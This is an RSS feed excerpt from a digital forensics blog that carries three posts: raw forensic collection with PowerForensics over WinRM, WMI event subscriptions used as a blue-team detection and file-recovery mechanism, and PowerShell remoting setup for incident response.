&lt;p&gt;Powerforensics is the best Powershell based forensics framework available, but has not been primarily designed for remote raw collections. With that in mind, during testing I discovered an issue in Powerforensics Copy command-lets around memory utilisation and limitation of file size. The limitation is around 2.1GB (Int32 max bytes) and caused by the way Powerforensics builds a byte array for the complete file stream prior to copying. The limitation also means that memory consumption for my use cases (large system files) spiked up to at least the size of the file.&lt;/p&gt;

&lt;p&gt;Normally this would be a game killer for using Powerforensics in this way. However, one of its best features is the ability to use an API and collect data at the appropriate level for your needs. In this case, I was able to leverage the Powerforensics API to collect files of interest in smaller chunks. The public method used is called ForensicDD and I am doing some traditional volume boot record calculations to enable a low memory footprint. File size limitations are also removed as the byte stream size has been significantly reduced.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/11forensicdd.png&quot; width=&quot;500&quot; /&gt;&lt;/div&gt;

&lt;p&gt;Its also worthy to note, the capability to copy alternate data streams besides hard coded special files is not exposed to the user. The ForensicCopy function will simply copy resident bytes or the DATA stream for a normal Raw file copy.&lt;/p&gt;

&lt;p&gt;Another performance tweak was with UsnJournal:$J to limit the collection to non-sparse data. This differs from most forensic collection tools that acquire all $J data and results in a bloated collection including redundant zeros. This method did hit a snag for an edgecase on a 2012R2 server where Powerforensics failed to parse the MFT entry as expected for the UsnJournal. This case is currently under review however I decided to implement a fall back collection via fsutil if required.&lt;/p&gt;

&lt;p&gt;In any case I would recommend tool validation of this collection compared to current tools. In my testing I was able to validate file size and entries with another tool with a similar approach finding sample journal entries as expected.&lt;/p&gt;

&lt;p&gt;Finally, for user experience, I also decided to implement CPU prioritisation to run my collection on idle CPU cycles only.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/12idlecpu.png&quot; width=&quot;400&quot; /&gt;&lt;/div&gt;

&lt;h3 id=&quot;forensic-footprint&quot;&gt;Forensic Footprint&lt;/h3&gt;
&lt;p&gt;The most important factor for forensic footprint should be to know and validate your tools. To respect the order of volatility I have moved Live Response mode to run first to minimise impact by ForensicCopy mode. I would also recommend a naming scheme of Live Response content to further respect order of volatility.&lt;/p&gt;

&lt;p&gt;There has been significant research to optimise target memory performance to be as low as possible. As primarily running in memory, the visible disk footprint of Powershell remoting is relatively small during a PSSession. With default logging, only expected authentication events and very basic WinRM and Powershell logs are generated. Wsmprovhost.exe is spawned on the target machine when running Invoke-LiveResponse and target disk activity is minimised with a remote share transfer. Depending on the collection, Net.exe and any other binaries called in script content may also be spawned from wsmprovhost.exe for their relevant functions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/13Process.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;

&lt;p&gt;During the collection we see the expected authentication IDs 4624 and 4672 to access the target machine. When in ForensicCopy mode, if enabled we also see Event ID 4648 - explicit logon resulting from the collection copy to remote share.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/14_4648.png&quot; width=&quot;400&quot; /&gt;&lt;/div&gt;

&lt;p&gt;In Powershell 5+ environments the capability to enable Powershell scriptblock logging highlights the benefit of visibility with Event ID 4104. Over multiple events we can see the Powerforensics functions being pushed to the target machine, decompressed and loaded to memory with the Add-PowerForensicsType function. We can also see the script block itself in the log. For a complete version, I have included a copy of the raw transaction logs &lt;a href=&quot;https://github.com/mgreen27/mgreen27.github.io/tree/master/other/Invoke-LiveResponse/Powershell%20Transcript&quot;&gt;here&lt;/a&gt; for review.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/15_4104.png&quot; width=&quot;400&quot; /&gt;&lt;/div&gt;

&lt;p&gt;Finally Event ID 4103 – Module logging records pipeline execution details as seen in the example below. Module logging has been available since Powershell 3+ and although not as verbose as 4104, collected context about the commands run inside my script block. Below you can see datastream preparation for an $MFT raw copy. Host application as “wsmprovhost.exe -Embedding” indicates a PSSession generated event.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/16_4103.png&quot; width=&quot;400&quot; /&gt;&lt;/div&gt;

&lt;h3 id=&quot;future-development-ideas&quot;&gt;Future development ideas&lt;/h3&gt;
&lt;p&gt;Invoke-LiveResponse has currently been limited scope. Some ideas for additional features are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Add memory collection capability to ForensicCopy mode for less reliance on LiveResponse scripts (and make appropriate order of volatility changes).&lt;/li&gt;
  &lt;li&gt;Expand scope to enable more scale through Powershell Start-Job capabilities.&lt;/li&gt;
  &lt;li&gt;Larger artefact coverage in ForensicCopy mode.&lt;/li&gt;
  &lt;li&gt;Automate analysis tasks.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
&lt;p&gt;In this post I have walked through Invoke-LiveResponse, a Powershell module that enables raw file collections and live response over WinRM. Work still needs to be done on scale optimisations, however it provides a viable option of raw collection when other tools fail.&lt;/p&gt;

&lt;p&gt;This kind of capability highlights where I believe Microsoft focused shops will be heading in the future. Although a political nightmare to setup in large environments, the Microsoft mantra of constrained endpoints, just in time administration and transparency in Powershell logging really assists opening up capability whilst minimising risk of remote administration.&lt;/p&gt;

&lt;p&gt;Overall it has been a great learning experience putting together, and optimising some of the Powershell features. Im hoping others can benefit from this post as much as I have enjoyed the research and writing it. Feel free to reach out if you have any questions, find any bugs or pull requests.&lt;/p&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
&lt;p&gt;1) Atkinson, Jared. &lt;a href=&quot;http://www.invoke-ir.com/&quot;&gt;Invoke-IR / Powerforensics&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2) Australian Signals Directorate. &lt;a href=&quot;http://www.asd.gov.au/publications/protect/Securing_PowerShell.pdf&quot;&gt;Securing PowerShell in the Enterprise&lt;/a&gt;, 2016&lt;/p&gt;

&lt;p&gt;3) Dunwoody, Matthew. &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.htm&quot;&gt;Greater Visibility Through PowerShell Logging&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4) Forensics wiki. &lt;a href=&quot;http://www.forensicswiki.org/wiki/New_Technology_File_System_NTFS&quot;&gt;New Technology File Systems (general NTFS information)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;5) Green, Matthew. &lt;a href=&quot;https://www.linkedin.com/pulse/powershell-remoting-incident-response-matthew-green/&quot;&gt;Powershell Remoting and Incident Response (WinRM lab setup)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;6) Invoke-LiveResponse &lt;a href=&quot;https://github.com/mgreen27/Powershell-IR&quot;&gt;https://github.com/mgreen27/Powershell-IR&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;7) Sayer, Matthew. &lt;a href=&quot;http://www.hecfblog.com/2017/05/contents-in-sparse-mirror-may-be.html&quot;&gt;Contents in sparse mirror may be smaller than they appear&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sun, 14 Jan 2018 00:00:00 +1100</pubDate>
        <link>https://mgreen27.github.io/posts/2018/01/14/Invoke-LiveResponse.html</link>
        <guid isPermaLink="true">https://mgreen27.github.io/posts/2018/01/14/Invoke-LiveResponse.html</guid>
        
        <category>DFIR</category>
        
        <category>Powershell</category>
        
        <category>LiveResponse</category>
        
        <category>IR</category>
        
        
        <category>posts</category>
        
      </item>
    
      <item>
        <title>Blue Team Hacks - WMI Eventing</title>
        <description>&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2017-04-03-WMI/00Title.jpg&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;h2 id=&quot;blue-team-hacks---wmi-eventing&quot;&gt;Blue Team Hacks - WMI Eventing&lt;/h2&gt;
&lt;p&gt;In this post I am going to cover a little Windows Management Instrumentation (WMI), and in particular an interesting use case for potential use in older environments with Process Monitoring gaps. Thinking about this gap led to me looking at WMI starting as an alternate near real time detection fix, and during feature investigation ended with another technically novel solution I thought was interesting enough to share.&lt;/p&gt;

&lt;h1 id=&quot;the-problem&quot;&gt;The problem&lt;/h1&gt;
&lt;p&gt;I recently worked an engagement where our Process Monitoring tool of choice utilised Microsoft Sysmon. Unfortunately Sysmon only supports Windows 2008R2 and above, presenting with an interesting visibility gap for older machines. The first question was, how can I provide some advanced capability without needing to install another agent?&lt;/p&gt;

&lt;p&gt;Another interesting question is what if as a defender I would like to run an automated action directly on the endpoint if certain conditions exist? A use case of file recovery to mitigate a potential threat actor over a short timeframe dropping a few files, running the tools and collecting output, then removing artefacts from disk with little chance of deleted file recovery. In this instance developing a solution that could also enable an alert, then copy, of files soon after they hit a staging folder could increase recoverability.&lt;/p&gt;

&lt;h1 id=&quot;so-what-is-wmi&quot;&gt;So what is WMI?&lt;/h1&gt;
&lt;p&gt;Windows Management Instrumentation is a framework used to manage Windows Systems and has been an important part of all Windows operating systems since Windows Millennium Edition. The WMI schema is Microsoft’s implementation of the Common Information Model (CIM) and Web-Based Enterprise Management (WBEM) standards by the Distributed Management Taskforce. The purpose of WMI is to enable a standardisation in the way environment classes are modelled, representing the environment data that can be accessed in a common way.&lt;/p&gt;

&lt;p&gt;In layman terms, WMI both describes and is part of the “guts” of Windows internals. WMI can collect informative things like current state, or performance statistics but also capability to query, configure and take actions. WMI is often invoked through various scripting languages like PowerShell or VBScript, with both IT Operations and Offensive types using various WMI capabilities for many years. Some of the more interesting offensive use cases are persistence, reconnoissance, lateral movement, hidden storage and even command &amp;amp; control.&lt;/p&gt;

&lt;p&gt;Unfortunately WMI is minimally documented beyond MSDN and technical code references, all of which will not be covered in this post. For those interested I have included some relevant links in my references section below for further research.&lt;/p&gt;

&lt;h1 id=&quot;wmi-eventing&quot;&gt;WMI Eventing&lt;/h1&gt;
&lt;p&gt;A WMI event subscription is a method of subscribing to certain system events. WMI eventing can be used to action on almost any operating system event. For example - logon, process, registry or file activity. In my use case I am particularly interested in files being created in known staging locations on the endpoint or a particular method of lateral movement that leveraged WMI process creation. I would also require a relevant action of alert, event log generation and for the staging locations, file copy to a different folder.&lt;/p&gt;

&lt;p&gt;WMI Eventing comes in two flavours, a local single process context or permanent WMI Event Subscriptions which are our focus today. These permanent subscriptions are stored in the WMI repository and persist across system shutdown / reboots. It is also worthy to note permanent WMI events run as SYSTEM level privileges.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2017-04-03-WMI/01WMIOverview.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are 3 components in WMI Eventing:&lt;/p&gt;

&lt;h4 id=&quot;1-an-event-filter&quot;&gt;&lt;strong&gt;1. An Event Filter&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;An Event Filter is a WQL query that outlines the event of interest. Think of this as the “signature” component of which are two types covering almost all conceivable operating system events.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Intrinsic events&lt;/strong&gt; are polled events that fire upon a polling interval. In research there was some concern around best practice for performance of polling intervals, in my testing I found no large performance hits however would recommend at least 30 seconds as standard, especially when deploying many Intrinsic event filters.
In my use case I used a a WQL query that polls every 30 seconds to report on all file creations in relevant staging location. For example: C:\Windows\VSS.&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;	&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__InstanceCreationEvent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WITHIN&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TargetInstance&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ISA&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;CIM_DataFile&quot;&lt;/span&gt; 
	&lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TargetInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Drive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;C:&quot;&lt;/span&gt; 
	&lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TargetInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;VSS&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;” &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;Alternatively, &lt;strong&gt;Extrinsic events&lt;/strong&gt; are real time filters. The downside is there are not a lot of Extrinsic events available, but they should take preference over Intrinsic.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Below will alert on WMI Process Create event and trigger on some WMI based lateral movement.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;	&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MSFT_WmiProvider_ExecMethodAsyncEvent_Pre&lt;/span&gt; 
	&lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObjectPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;Win32_Process&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MethodName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;Create&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;2-event-consumer&quot;&gt;&lt;strong&gt;2. Event Consumer&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;An Event Consumer is an action to perform upon triggering an event. There are 5 possible classes.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ActiveScriptEventConsumer&lt;/strong&gt; - Executes a script by reference or embedded in the consumer itself, support for VBScript via WSH.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CommandLineEventConsumer&lt;/strong&gt;  - Executes a specified binary or command line, preferred for PowerShell execution, potential for use with an encoded command for embedded PowerShell.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;LogFileEventConsumer&lt;/strong&gt; - Write to a specified log file.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;NTEventLogEventConsumer&lt;/strong&gt; - Logs a Message to the Application EventLog&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SMTPEventConsumer&lt;/strong&gt; - Sends an email message using SMTP every time that an event is delivered to it.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I initially was looking at NTEventLogEventConsumer which could be the preferred option for most organisations looking for a monitoring capability. For my use case above, I ended up implementing an ActiveScriptEventConsumer that wrote to a particular log file and completed the file copy in a single Event Consumer to a friendly folder. The alerts and file copy status for each machine is managed and retrieved by a centralised dashboard, however the solution could alert, post, or write to any scriptable resource.&lt;/p&gt;

&lt;h4 id=&quot;3-filter-to-consumer-binding&quot;&gt;&lt;strong&gt;3. Filter to Consumer Binding&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Filter to consumer Binding is the registration mechanism that binds a filter to a consumer.&lt;/p&gt;

&lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;
&lt;p&gt;With WMI we have a powerful but difficult to manage capability that can be used in some interesting technical use cases. The scope of capabilities being limited to understanding WMI classes and taking the time to build filters and event consumers.&lt;/p&gt;

&lt;p&gt;Its worthy to note there is a proof of concept capability currently available from the research community. FLARE WMI-IDS and Invoke-IR Uproot-IDS (see references) provides a good starting point for those looking to build their own solution.&lt;/p&gt;

&lt;p&gt;One of the major difficulties with WMI Eventing is troubleshooting problems with event consumers. With this in mind I found best workflow came with using some reference code to develop a simple template to assist understanding and troubleshooting efforts then expand into using the above frameworks as new functionality not incorporated is validated and understood.&lt;/p&gt;

&lt;p&gt;For those interested, I have also included a reference PowerShell script on GitHub - &lt;a href=&quot;https://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;HERE&lt;/a&gt; -  to help anyone looking to create a similar ActiveScriptEventConsumer described above.&lt;/p&gt;

&lt;p&gt;Hopefully this post has provided some good food for thought and pointed interested parties in the direction for further research and reference material. Feel free to reach out if you have any questions.&lt;/p&gt;

&lt;h3 id=&quot;references&quot;&gt;References:&lt;/h3&gt;
&lt;p&gt;1) Ballenthin,William. Graeber, Matt. Teodorescu Claudiu. &lt;a href=&quot;https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;Windows Management Instrumentation (WMI) Offense, Defense, and Forensics&lt;/a&gt;, 2015&lt;/p&gt;

&lt;p&gt;2) Distributed Management Task Force, &lt;a href=&quot;http://www.dmtf.org/standards/cim?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;Common Information Model&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3) Distributed Management Task Force, &lt;a href=&quot;http://www.dmtf.org/standards/wbem?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;Web-Based Enterprise Management&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4) Fireeye FLARE. &lt;a href=&quot;https://github.com/fireeye/flare-wmi/tree/master/WMI-IDS?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;WMI-IDS&lt;/a&gt;, 2015&lt;/p&gt;

&lt;p&gt;5) Invoke IR. &lt;a href=&quot;https://github.com/Invoke-IR/Uproot?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;Uproot&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;6) Kerr, &lt;a href=&quot;https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;Devon.There’s Something About WMI&lt;/a&gt;, 2015&lt;/p&gt;

&lt;p&gt;7) MSDN. &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/aa394582(v=vs.85).aspx?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;Windows Management Instrumentation&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;8) Parisi, Timothy. Pena, Evan. &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2016/08/wmi_vs_wmi_monitor.html?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;WMI vs. WMI: Monitoring for Malicious Activity&lt;/a&gt;, 2016&lt;/p&gt;

&lt;p&gt;9) US Department of Homeland Security. &lt;a href=&quot;https://ics-cert.us-cert.gov/sites/default/files/documents/WMI_for_Detection_and_Response_S508C.pdf?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;WMI for Detection and Response&lt;/a&gt;, 2016&lt;/p&gt;
</description>
        <pubDate>Mon, 03 Apr 2017 00:00:00 +1000</pubDate>
        <link>https://mgreen27.github.io/posts/2017/04/03/Blue_Team_Hacks-WMI_Eventing.html</link>
        <guid isPermaLink="true">https://mgreen27.github.io/posts/2017/04/03/Blue_Team_Hacks-WMI_Eventing.html</guid>
        
        <category>DFIR</category>
        
        <category>Powershell</category>
        
        <category>WMI</category>
        
        
        <category>posts</category>
        
      </item>
    
      <item>
        <title>PowerShell Remoting and Incident Response</title>
        <description>&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2017-01-12-PowerShell_Remoting_IR/00PowerShellthumb.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;powershell-remoting-and-incident-response&quot;&gt;PowerShell Remoting and Incident Response&lt;/h2&gt;
&lt;p&gt;PowerShell is quickly becoming a tool of choice for many IT Operations staff and Security Practitioners alike. This post is a quick overview of using Windows Remote Management and PowerShell for Incident Response. I will also provide some proof of concept setup instructions and general themes for those interested in further research on this topic.&lt;/p&gt;

&lt;h3 id=&quot;so-what-is-windows-remote-management&quot;&gt;So what is Windows Remote Management?&lt;/h3&gt;
&lt;p&gt;PowerShell is a powerful scripting language for systems management due to its ability to run on remote systems, automation capability and ability to scale. The component enabling this capability is called the Windows Remote Management service (WinRM), which works over a standardised Simple Object Access Protocol (SOAP) based, firewall friendly protocol – WS Management. PowerShell is just one consumer of this service/protocol combo and with all Windows management communications heading down this path, this capability is only going to be further entrenched moving forward.&lt;/p&gt;

&lt;p&gt;Windows Remote Management has been available since PowerShell 2.0 and Windows 7 through to the most recent incarnation in Windows Management Framework (WMF) 5.1. WinRM is enabled by default in Windows Server 2012 and 2016 but, as you’ll see below, simple to enable back to Windows 7 running PowerShell 2.0.&lt;/p&gt;

&lt;h3 id=&quot;why-do-i-care&quot;&gt;Why do I care?&lt;/h3&gt;
&lt;p&gt;There are six primary reasons why you should care about PowerShell Remoting for Incident Response:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Data available for Collection&lt;/strong&gt; - PowerShell has access to WMI, COM, .NET as well as to the Windows API. When combined with the capability to run some smart 3rd party or open source tools there really isn’t much you can’t do with PowerShell. Data collection is possible from: static disk, registry, log and configuration data; or any volatile process, network connection, or other in memory artefact. Historical data can be collected with timeline collection tools or pre-deployment of a process monitoring tool or Event Tracing for Windows.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Analysis&lt;/strong&gt; - PowerShell is an object based language making analysis fairly simple once the dataset and methods of sorting / searching are understood. There is much integration readily available for common use cases like: live response, outlier analysis, baseline comparisons or building a timeline&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Performance&lt;/strong&gt; - PowerShell Remoting can significantly improve performance when scripting collections at scale. Execution of the command occurs in parallel on each target machine reporting the results, opposed to the source machine running through commands in an iterative scripted loop.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2017-01-12-PowerShell_Remoting_IR/01performance.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Strategic&lt;/strong&gt; - Windows Remote Management is Microsoft’s strategic direction for all Windows management communications moving forward. Many operations teams are already considering or currently using WinRM so it is worthwhile to understand points of leverage and weaknesses. Interestingly, PowerShell is also now open source with both OSX and Linux versions available.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Agentless&lt;/strong&gt; - PowerShell remoting provides capability without needing to install “yet another agent”.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Cost&lt;/strong&gt; – It is hard to argue with free, especially if there are skillsets in house already taking advantage of WinRM / PowerShell remoting.&lt;/p&gt;

&lt;h3 id=&quot;what-is-the-catch&quot;&gt;What is the catch?&lt;/h3&gt;
&lt;p&gt;The benefits of PowerShell remoting seem quite compelling but there are two main catches:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Operational overhead&lt;/strong&gt; - Traditional open source issues of cost to build and maintain capability rather than going down a COTS path. Most organisations are not really mature enough to fully embrace building a complete solution in this space beyond simple collections (not everyone is a well resourced Fortune 500).&lt;/p&gt;

&lt;p&gt;A great example here is process monitoring solutions - i.e. collection and analysis of historical data. While open source collection via Sysmon or other tools is available and better than the status quo in most organisations (i.e. nothing), a paid solution may provide much more capability at lower overall cost. When deciding to build, buy or outsource it is important not only understanding requirements, but also workflow underpinning those requirements, as well as technology and architecture.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Security perceptions&lt;/strong&gt; - There are concerns around PowerShell security. Increased in-wild threats and popularity of offensive research in the past few years have driven this concern. Although most definitely not infallible, a properly configured PowerShell network will arguably lead to a much more secure environment than default - “properly configured” being the key word. With that in mind, similar to operational overhead, maturity may be the major driver for concerns about turning on WinRM.&lt;/p&gt;

&lt;p&gt;It’s also worthy to note Microsoft has come a long way in recent editions of Windows and PowerShell from the original WinRM version included in Windows 7. Modern Windows 10 / PowerShell 5.0 versions feature comprehensive auditing capabilities for PowerShell and additional OS level security features. Features like Credential Guard, Device Guard, Applocker and AntiMalware ScanInterface (when used mainstream); combined with the Microsoft concept of “constrained endpoints” will really help reduce options for attackers.&lt;/p&gt;

&lt;h1 id=&quot;so-how-do-i-start&quot;&gt;So how do I start?&lt;/h1&gt;
&lt;p&gt;There are a few ways to setup WinRM. Group Policy, you can use a command line tool (Winrm), or PowerShell cmdlets. I have pointed at some good resources including ideas to lock down Windows Remote Management and how to configure WinRM over HTTPS in the reference section below.&lt;/p&gt;

&lt;p&gt;A useful method for Lab / Proof of Concept testing is via group policy; also consider turning on PowerShell script block logging and process monitoring to list a couple of other generic recommendations. In a nutshell for a basic WinRM configuration you are required to:&lt;/p&gt;

&lt;h4 id=&quot;1-configure-a-winrm-listener&quot;&gt;1. Configure a WinRM listener&lt;/h4&gt;
&lt;p&gt;Note: Examples are referencing Windows 2012R2 Domain with client machines running PowerShell 2.0 (WinRM minimum requirement) through 5.0. Recommendations are to upgrade to WMF5.0 to take advantage of capabilities like PowerShell Script Block logging and additional built-in PowerShell cmdlets.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2017-01-12-PowerShell_Remoting_IR/02config1.png&quot; width=&quot;400&quot; /&gt;&lt;/div&gt;

&lt;p&gt;Group Policy &amp;gt; Computer Configuration &amp;gt; Policies &amp;gt; Administrative Templates &amp;gt; Windows Components &amp;gt; Windows Remote Management &amp;gt; WinRM Service &amp;gt; Allow Remote server management through WinRM &amp;gt; Here you are required to Enable WinRM and set service listening IP to * or IP of listening interface.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2017-01-12-PowerShell_Remoting_IR/03config2.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;h4 id=&quot;2-configure-the-winrm-service-to-start-automatically&quot;&gt;2. Configure the WinRM service to start automatically&lt;/h4&gt;
&lt;p&gt;Group Policy &amp;gt; Computer Configuration &amp;gt; Policies &amp;gt; Windows Settings &amp;gt; Security Settings &amp;gt; System Services &amp;gt; Windows Remote Management (WS-Management) &amp;gt; set to automatic&lt;/p&gt;

&lt;p&gt;Note: a client reboot is required to start Windows Remote Management Service automatically from Group Policy.&lt;/p&gt;

&lt;h4 id=&quot;3-allow-winrm-traffic-through-the-firewall&quot;&gt;3. Allow WinRM traffic through the firewall&lt;/h4&gt;
&lt;p&gt;Group Policy &amp;gt; Computer Configuration &amp;gt; Policies &amp;gt; Windows Settings &amp;gt; Security Settings &amp;gt; Windows Firewall… &amp;gt; Windows Firewall… &amp;gt; Inbound Rule &amp;gt; Create rule using predefined Windows Remote Management (HTTP-In)&lt;/p&gt;

&lt;h4 id=&quot;4-ensure-local-admin-privileges-on-the-target-machine&quot;&gt;4. Ensure local admin privileges on the target machine.&lt;/h4&gt;
&lt;p&gt;Note: WinRM can be configured to NOT require local admin however some of the collections your going to want to run will likely require administrator privilege. Credential risk is minimised using the default WinRM Kerberos authentication.&lt;/p&gt;

&lt;p&gt;Group Policy &amp;gt; Computer Configuration &amp;gt; Policies &amp;gt; Preferences &amp;gt; Control Panel Settings &amp;gt; Local Users and Groups &amp;gt; right click &amp;gt; All Tasks &amp;gt; Add &amp;gt; add User or Group to local administrators group.&lt;/p&gt;

